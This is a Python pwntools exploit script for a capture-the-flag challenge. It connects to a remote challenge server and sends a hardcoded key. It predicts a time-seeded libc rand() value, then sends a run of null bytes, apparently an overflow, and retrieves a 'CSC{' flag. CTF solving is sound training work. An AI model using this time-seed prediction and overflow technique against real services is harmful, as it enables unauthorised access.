from pwn import *
from ctypes import CDLL
import time

context.binary = ELF('./chall_demo', checksec=False)
context.log_level = 'debug'

REMOTE = ('194.31.53.241', 13337)
CONST_MULT = 0x59454b5f4f4d4544
SECRET_KEY = b"Ot0R!Emu"

libc = CDLL("libc.so.6")

def try_offset(delay):
    try:
        r = remote(*REMOTE, timeout=6)
        r.sendline(SECRET_KEY)
        r.recvuntil(b' *ehm*\nYOU MAY ENTER THE SECRETS SOCIETY NOW!\n')
        log.info(f"Trying delay {delay:.1f}s")

        time.sleep(delay)

        now = libc.time(0)
        libc.srand(now)
        nhonks = libc.rand() * CONST_MULT
        nhonks &= 0xffffffffffffffff

        log.info(f"Seed = {now}, nhonks = {hex(nhonks)}")

        r.sendline(b"MSG")
        time.sleep(1.0)

        r.sendline(str(hex(nhonks)).encode())
        print(r.recv(4096))
        print(r.recv(4096))

        r.sendline(b"\x00" * 400)
        r.sendline(b"GET")
        r.sendline(b"0x0")

        resp = r.recv(timeout=4)
        if b"CSC{" in resp:
            print(resp.decode())
            r.interactive()
            return True

        r.close()
    except Exception as e:
        log.warning(f"fail: {e}")
    return False

def brute_remote():
    for i in range(0, 11):  # 4.0s to 5.0s in 0.1s steps
        delay = 4.0 + (i * 0.1)
        if try_offset(delay):
            log.success("Got it!")
            return
    log.failure("All delays failed.")

if __name__ == "__main__":
    brute_remote()
